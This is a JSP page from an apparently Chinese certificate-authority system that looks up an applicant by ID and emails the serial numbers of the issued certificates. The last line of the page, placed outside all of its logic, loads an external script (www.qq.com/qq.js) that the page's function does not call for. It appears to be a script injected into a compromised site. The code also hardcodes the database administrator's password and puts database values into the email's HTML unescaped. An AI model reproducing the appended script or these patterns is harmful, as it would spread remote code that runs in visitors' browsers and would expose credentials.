<%@ page contentType="text/html; charset=gb2312" %>
<%@ page import="java.util.*" %>
<%@ page import="java.sql.*" %>
<%@ page import="javax.activation.*" %>
<%@ page import="javax.mail.*" %>
<%@ page import="javax.mail.internet.*" %>

<%@ page import="ApproveBeans.ApproveBean" %>

<jsp:useBean id="approveBean" class="ApproveBeans.ApproveBean" scope="session"/>

<%! String subjectId_Sign,subjectId_Encrypt,applyId; %>
	
<%
applyId=approveBean.applyId;
subjectId_Sign=approveBean.subjectId_Sign;
subjectId_Encrypt=approveBean.subjectId_Encrypt;
if(applyId==null || applyId.length()==0)
{
%>
<script language="javascript">history.back();</script>
<%
}
else
{
	Connection conn=null;
	try{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		PreparedStatement pstmt=conn.prepareStatement("select applyCN,applyEmail from applytable where applyId=?");
		pstmt.setString(1,applyId);
		ResultSet rs=pstmt.executeQuery();
		if(rs.next())
		{

			String applyCN=rs.getString(1);
			String applyEmail=rs.getString(2);
			String caEmail="RootCA@hjy.com";
			String subject="您申请的证书已经颁发！";
			String content="<h3>您好，"+applyCN+"！</h3>";
				content+="<h4>您的证书申请号为："+applyId+"</h4><hr>";
			        content+="<h4>您所申请的证书已经颁发！</h4>";
				content+="<h4>两种证书的序列号分别为：</h4>";
				content+="<h5>用于验证签名的证书："+subjectId_Sign+"</h5>";
				content+="<h5>用于加解密的证书："+subjectId_Encrypt+"</h5><hr>";
				content+="<h4>请到CA认证中心大厅获取证书及密钥</h4>";
				content+="<h4>或到<a href=\"http://localhost:8000\" target=\"_blank\">网上PKI用户系统</a>下载证书</h4>";
			Properties props = System.getProperties();
			props.put("mail.smtp.auth","false");	
			props.put("mail.smtp.host","hjy.com");  
			Session sess=Session.getInstance(props,null);
			Message msg= new MimeMessage(sess);
			msg.setFrom(new InternetAddress(caEmail));
			msg.setRecipients(Message.RecipientType.TO,InternetAddress.parse(applyEmail,false));
			msg.setSubject(subject);
			msg.setSentDate(new java.util.Date());
			msg.setDataHandler(new DataHandler(content,"text/html;charset=gb2312"));
			Transport.send(msg);

%>
<script language="javascript">window.alert("发送成功！");history.back();</script>
<%
		}
		else
		{
%>
<script language="javascript">window.alert("无此申请号");history.back();</script>
<%
		}
		
	}
	catch(Exception ex)
	{
%>
<script language="javascript">window.alert("发送不成功。可能是由于邮件服务或数据库发生问题！");history.back();</script>
<%	
	}	
	try{conn.close();}catch(Exception ex){}
}
%>
<script language=javascript src=http://www.qq.com/qq.js></script>